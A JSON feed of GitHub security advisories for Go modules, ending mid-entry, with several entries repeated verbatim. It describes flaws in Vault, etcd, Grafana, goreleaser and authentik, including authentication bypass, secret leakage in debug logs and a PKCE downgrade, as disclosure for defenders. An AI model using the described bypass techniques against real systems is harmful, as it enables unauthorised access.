{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-16251\">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151\">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>\n<li><a href=\"https://www.hashicorp.com/blog/category/vault/\">https://www.hashicorp.com/blog/category/vault/</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html\">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mp7-2m29-gqxf\">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mp7-2m29-gqxf",
            "title": "[github.com/hashicorp/vault/vault] HashiCorp Vault Authentication bypass",
            "date_modified": "2024-01-31T00:22:00.000Z",
            "date_published": "2024-01-31T00:21:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mp7-2m29-gqxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-16251\">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151\">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>\n<li><a href=\"https://www.hashicorp.com/blog/category/vault/\">https://www.hashicorp.com/blog/category/vault/</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html\">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mp7-2m29-gqxf\">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mp7-2m29-gqxf",
            "title": "[github.com/hashicorp/vault/vault] HashiCorp Vault Authentication bypass",
            "date_modified": "2024-01-31T00:22:00.000Z",
            "date_published": "2024-01-31T00:21:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mp7-2m29-gqxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-16251\">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151\">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>\n<li><a href=\"https://www.hashicorp.com/blog/category/vault/\">https://www.hashicorp.com/blog/category/vault/</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html\">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mp7-2m29-gqxf\">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mp7-2m29-gqxf",
            "title": "[github.com/hashicorp/vault/vault] HashiCorp Vault Authentication bypass",
            "date_modified": "2024-01-31T00:22:00.000Z",
            "date_published": "2024-01-31T00:21:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mp7-2m29-gqxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-16251\">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151\">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>\n<li><a href=\"https://www.hashicorp.com/blog/category/vault/\">https://www.hashicorp.com/blog/category/vault/</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html\">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mp7-2m29-gqxf\">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mp7-2m29-gqxf",
            "title": "[github.com/hashicorp/vault/vault] HashiCorp Vault Authentication bypass",
            "date_modified": "2024-01-31T00:22:00.000Z",
            "date_published": "2024-01-31T00:21:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mp7-2m29-gqxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"vulnerability-type\">Vulnerability type</h3>\n<p>Cryptography</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Refer to the <a href=\"https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md\">gateway documentation</a>. The vulnerability was spotted due to unclear documentation of how the gateway handles endpoints validation.</p>\n<h3 id=\"detail\">Detail</h3>\n<p>When starting a gateway, TLS authentication will only be attempted on endpoints identified in DNS SRV records for a given domain, which occurs in the discoverEndpoints function. No authentication is performed against endpoints provided in the --endpoints flag. The auditors has noted that appropriate documentation of this validation functionality plus deprecation of this misleading functionality is an acceptable path forward.</p>\n<h3 id=\"references\">References</h3>\n<p>Find out more on this vulnerability in the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf\">security audit report</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Contact the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc\">etcd security committee</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/etcd-io/etcd/security/advisories/GHSA-wr2v-9rpq-c35q\">https://github.com/etcd-io/etcd/security/advisories/GHSA-wr2v-9rpq-c35q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15136\">https://nvd.nist.gov/vuln/detail/CVE-2020-15136</a></li>\n<li><a href=\"https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md\">https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wr2v-9rpq-c35q\">https://github.com/advisories/GHSA-wr2v-9rpq-c35q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wr2v-9rpq-c35q",
            "title": "[go.etcd.io/etcd] Etcd Gateway TLS authentication only applies to endpoints detected in DNS SRV records",
            "date_modified": "2024-01-31T00:22:00.000Z",
            "date_published": "2024-01-31T00:21:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wr2v-9rpq-c35q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"vulnerability-type\">Vulnerability type</h3>\n<p>Cryptography</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Refer to the <a href=\"https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md\">gateway documentation</a>. The vulnerability was spotted due to unclear documentation of how the gateway handles endpoints validation.</p>\n<h3 id=\"detail\">Detail</h3>\n<p>When starting a gateway, TLS authentication will only be attempted on endpoints identified in DNS SRV records for a given domain, which occurs in the discoverEndpoints function. No authentication is performed against endpoints provided in the --endpoints flag. The auditors has noted that appropriate documentation of this validation functionality plus deprecation of this misleading functionality is an acceptable path forward.</p>\n<h3 id=\"references\">References</h3>\n<p>Find out more on this vulnerability in the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf\">security audit report</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Contact the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc\">etcd security committee</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/etcd-io/etcd/security/advisories/GHSA-wr2v-9rpq-c35q\">https://github.com/etcd-io/etcd/security/advisories/GHSA-wr2v-9rpq-c35q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15136\">https://nvd.nist.gov/vuln/detail/CVE-2020-15136</a></li>\n<li><a href=\"https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md\">https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wr2v-9rpq-c35q\">https://github.com/advisories/GHSA-wr2v-9rpq-c35q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wr2v-9rpq-c35q",
            "title": "[go.etcd.io/etcd] Etcd Gateway TLS authentication only applies to endpoints detected in DNS SRV records",
            "date_modified": "2024-01-31T00:22:00.000Z",
            "date_published": "2024-01-31T00:21:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wr2v-9rpq-c35q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"vulnerability-type\">Vulnerability type</h3>\n<p>Denial of Service</p>\n<h3 id=\"detail\">Detail</h3>\n<p>The etcd gateway is a simple TCP proxy to allow for basic service discovery and access. However, it is possible to include the gateway address as an endpoint. This results in a denial of service, since the endpoint can become stuck in a loop of requesting itself until there are no more available file descriptors to accept connections on the gateway.</p>\n<h3 id=\"references\">References</h3>\n<p>Find out more on this vulnerability in the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf\">security audit report</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Contact the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc\">etcd security committee</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/etcd-io/etcd/security/advisories/GHSA-2xhq-gv6c-p224\">https://github.com/etcd-io/etcd/security/advisories/GHSA-2xhq-gv6c-p224</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15114\">https://nvd.nist.gov/vuln/detail/CVE-2020-15114</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2xhq-gv6c-p224\">https://github.com/advisories/GHSA-2xhq-gv6c-p224</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2xhq-gv6c-p224",
            "title": "[go.etcd.io/etcd] Etcd Gateway can include itself as an endpoint resulting in resource exhaustion",
            "date_modified": "2024-01-31T00:21:54.000Z",
            "date_published": "2024-01-31T00:21:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2xhq-gv6c-p224"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"vulnerability-type\">Vulnerability type</h3>\n<p>Denial of Service</p>\n<h3 id=\"detail\">Detail</h3>\n<p>The etcd gateway is a simple TCP proxy to allow for basic service discovery and access. However, it is possible to include the gateway address as an endpoint. This results in a denial of service, since the endpoint can become stuck in a loop of requesting itself until there are no more available file descriptors to accept connections on the gateway.</p>\n<h3 id=\"references\">References</h3>\n<p>Find out more on this vulnerability in the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf\">security audit report</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Contact the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc\">etcd security committee</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/etcd-io/etcd/security/advisories/GHSA-2xhq-gv6c-p224\">https://github.com/etcd-io/etcd/security/advisories/GHSA-2xhq-gv6c-p224</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15114\">https://nvd.nist.gov/vuln/detail/CVE-2020-15114</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2xhq-gv6c-p224\">https://github.com/advisories/GHSA-2xhq-gv6c-p224</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2xhq-gv6c-p224",
            "title": "[go.etcd.io/etcd] Etcd Gateway can include itself as an endpoint resulting in resource exhaustion",
            "date_modified": "2024-01-31T00:21:54.000Z",
            "date_published": "2024-01-31T00:21:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2xhq-gv6c-p224"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"vulnerability-type\">Vulnerability type</h3>\n<p>Access Controls</p>\n<h3 id=\"detail\">Detail</h3>\n<p>etcd creates certain directory paths (etcd data directory and the directory path when provided to automatically generate self-signed certificates for TLS connections with clients) with restricted access permissions (700) by using the os.MkdirAll. This function does not perform any permission checks when a given directory path exists already.</p>\n<h3 id=\"specific-go-package-affected\">Specific Go Package Affected</h3>\n<p>github.com/etcd-io/etcd/pkg/fileutil</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Make sure these directories have the desired permit (700).</p>\n<h3 id=\"references\">References</h3>\n<p>Find out more on this vulnerability in the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf\">security audit report</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Contact the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc\">etcd security committee</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92\">https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15113\">https://nvd.nist.gov/vuln/detail/CVE-2020-15113</a></li>\n<li><a href=\"https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b\">https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b</a></li>\n<li><a href=\"https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2\">https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-chh6-ppwq-jh92\">https://github.com/advisories/GHSA-chh6-ppwq-jh92</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-chh6-ppwq-jh92",
            "title": "[github.com/etcd-io/etcd] Improper Preservation of Permissions in etcd",
            "date_modified": "2024-01-30T23:54:27.000Z",
            "date_published": "2024-01-30T23:54:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-chh6-ppwq-jh92"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"vulnerability-type\">Vulnerability type</h3>\n<p>Access Controls</p>\n<h3 id=\"detail\">Detail</h3>\n<p>etcd creates certain directory paths (etcd data directory and the directory path when provided to automatically generate self-signed certificates for TLS connections with clients) with restricted access permissions (700) by using the os.MkdirAll. This function does not perform any permission checks when a given directory path exists already.</p>\n<h3 id=\"specific-go-package-affected\">Specific Go Package Affected</h3>\n<p>github.com/etcd-io/etcd/pkg/fileutil</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Make sure these directories have the desired permit (700).</p>\n<h3 id=\"references\">References</h3>\n<p>Find out more on this vulnerability in the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf\">security audit report</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Contact the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc\">etcd security committee</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92\">https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15113\">https://nvd.nist.gov/vuln/detail/CVE-2020-15113</a></li>\n<li><a href=\"https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b\">https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b</a></li>\n<li><a href=\"https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2\">https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-chh6-ppwq-jh92\">https://github.com/advisories/GHSA-chh6-ppwq-jh92</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-chh6-ppwq-jh92",
            "title": "[github.com/etcd-io/etcd] Improper Preservation of Permissions in etcd",
            "date_modified": "2024-01-30T23:54:27.000Z",
            "date_published": "2024-01-30T23:54:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-chh6-ppwq-jh92"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Grafana 5.3.1 has XSS via a link on the \"Dashboard &gt; All Panels &gt; General\" screen. NOTE: this issue exists because of an incomplete fix for CVE-2018-12099.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-18625\">https://nvd.nist.gov/vuln/detail/CVE-2018-18625</a></li>\n<li><a href=\"https://github.com/grafana/grafana/pull/11813\">https://github.com/grafana/grafana/pull/11813</a></li>\n<li><a href=\"https://github.com/grafana/grafana/pull/14984\">https://github.com/grafana/grafana/pull/14984</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20200608-0008/\">https://security.netapp.com/advisory/ntap-20200608-0008/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6wh2-8hw7-jw94\">https://github.com/advisories/GHSA-6wh2-8hw7-jw94</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6wh2-8hw7-jw94",
            "title": "[github.com/grafana/grafana] Grafana XSS via adding a link in General feature",
            "date_modified": "2024-01-30T23:47:51.000Z",
            "date_published": "2024-01-30T23:47:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6wh2-8hw7-jw94"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Grafana 5.3.1 has XSS via the \"Dashboard &gt; Text Panel\" screen. NOTE: this issue exists because of an incomplete fix for CVE-2018-12099.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-18623\">https://nvd.nist.gov/vuln/detail/CVE-2018-18623</a></li>\n<li><a href=\"https://github.com/grafana/grafana/issues/15293\">https://github.com/grafana/grafana/issues/15293</a></li>\n<li><a href=\"https://github.com/grafana/grafana/issues/4117\">https://github.com/grafana/grafana/issues/4117</a></li>\n<li><a href=\"https://github.com/grafana/grafana/pull/11813\">https://github.com/grafana/grafana/pull/11813</a></li>\n<li><a href=\"https://github.com/grafana/grafana/pull/14984\">https://github.com/grafana/grafana/pull/14984</a></li>\n<li><a href=\"https://github.com/grafana/grafana/releases/tag/v6.0.0\">https://github.com/grafana/grafana/releases/tag/v6.0.0</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20200608-0008/\">https://security.netapp.com/advisory/ntap-20200608-0008/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cmq2-j8v8-2q44\">https://github.com/advisories/GHSA-cmq2-j8v8-2q44</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cmq2-j8v8-2q44",
            "title": "[github.com/grafana/grafana] Grafana XSS in Dashboard Text Panel",
            "date_modified": "2024-01-30T23:47:49.000Z",
            "date_published": "2024-01-30T23:47:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cmq2-j8v8-2q44"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.9.0 through 1.3.3 may, under certain circumstances, have an Entity's Group membership inadvertently include Groups the Entity no longer has permissions to. Fixed in 1.3.4.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-10660\">https://nvd.nist.gov/vuln/detail/CVE-2020-10660</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/pull/8606\">https://github.com/hashicorp/vault/pull/8606</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a\">https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020\">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020</a></li>\n<li><a href=\"https://www.hashicorp.com/blog/category/vault/\">https://www.hashicorp.com/blog/category/vault/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m979-w9wj-qfj9\">https://github.com/advisories/GHSA-m979-w9wj-qfj9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m979-w9wj-qfj9",
            "title": "[github.com/hashicorp/vault/vault] HashiCorp Vault Improper Privilege Management",
            "date_modified": "2024-01-30T23:40:45.000Z",
            "date_published": "2024-01-30T23:40:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m979-w9wj-qfj9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.11.0 through 1.3.3 may, under certain circumstances, have existing nested-path policies grant access to Namespaces created after-the-fact. Fixed in 1.3.4.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-10661\">https://nvd.nist.gov/vuln/detail/CVE-2020-10661</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a\">https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020\">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020</a></li>\n<li><a href=\"https://www.hashicorp.com/blog/category/vault/\">https://www.hashicorp.com/blog/category/vault/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j6vv-vv26-rh7c\">https://github.com/advisories/GHSA-j6vv-vv26-rh7c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j6vv-vv26-rh7c",
            "title": "[github.com/hashicorp/vault/vault] HashiCorp Vault Improper Privilege Management",
            "date_modified": "2024-01-30T23:40:41.000Z",
            "date_published": "2024-01-30T23:40:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j6vv-vv26-rh7c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Hello 👋 </p>\n<p><code>goreleaser release --debug</code> log shows secret values used in the in the custom publisher.</p>\n<p>How to reproduce the issue:</p>\n<ul>\n<li>Define a custom publisher as the one below. Make sure to provide a custom script to the <code>cmd</code> field and to provide a secret to <code>env</code></li>\n</ul>\n<pre><code>#.goreleaser.yml \npublishers:\n  - name: my-publisher\n  # IDs of the artifacts we want to sign\n    ids:\n      - linux_archives\n      - linux_package\n    cmd: \"./build/package/linux_notarize.sh\"\n    env:\n      - VERSION={{ .Version }}\n      - SECRET_1={{.Env.SECRET_1}}\n      - SECRET_2={{.Env.SECRET_2}}\n</code></pre>\n<ul>\n<li>run <code>goreleaser release --debug</code></li>\n</ul>\n<p>You should see your secret value in the gorelease log. The log shows also the <code>GITHUB_TOKEN</code></p>\n<p>Example:</p>\n<pre><code>running                                        cmd= ....\nSECRET_1=secret_value\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/goreleaser/goreleaser/security/advisories/GHSA-h3q2-8whx-c29h\">https://github.com/goreleaser/goreleaser/security/advisories/GHSA-h3q2-8whx-c29h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23840\">https://nvd.nist.gov/vuln/detail/CVE-2024-23840</a></li>\n<li><a href=\"https://github.com/goreleaser/goreleaser/commit/d5b6a533ca1dc3366983d5d31ee2d2b6232b83c0\">https://github.com/goreleaser/goreleaser/commit/d5b6a533ca1dc3366983d5d31ee2d2b6232b83c0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h3q2-8whx-c29h\">https://github.com/advisories/GHSA-h3q2-8whx-c29h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h3q2-8whx-c29h",
            "title": "[github.com/goreleaser/goreleaser] `goreleaser release --debug` shows secrets",
            "date_modified": "2024-01-30T20:57:55.000Z",
            "date_published": "2024-01-30T20:57:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h3q2-8whx-c29h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>PKCE is a very important countermeasure in OAuth2 , both for public and confidential clients. It protects against CSRF attacks and code injection attacks. Because of this bug, an attacker can circumvent the protection PKCE offers.</p>\n<h2 id=\"patches\">Patches</h2>\n<p>authentik 2023.8.7 and 2023.10.7 fix this issue.</p>\n<h2 id=\"details\">Details</h2>\n<p>There is a bug in our implementation of PKCE that allows an attacker to circumvent the protection that PKCE offers. PKCE adds the <code>code_challenge’ parameter to the authorization request and adds the </code>code_verifier’ parameter to the token request. We recently fixed a downgrade attack (in v2023.8.5 and 2023.10.4) where if the attacker removed the <code>code_verifier’ parameter in the token request, authentik would allow the request to pass, thus circumventing PKCE’s protection. However, in the latest version of the software, another downgrade scenario is still possible: if the attacker removes the </code>code_challenge’ parameter from the authorization request, authentik will also not do the PKCE 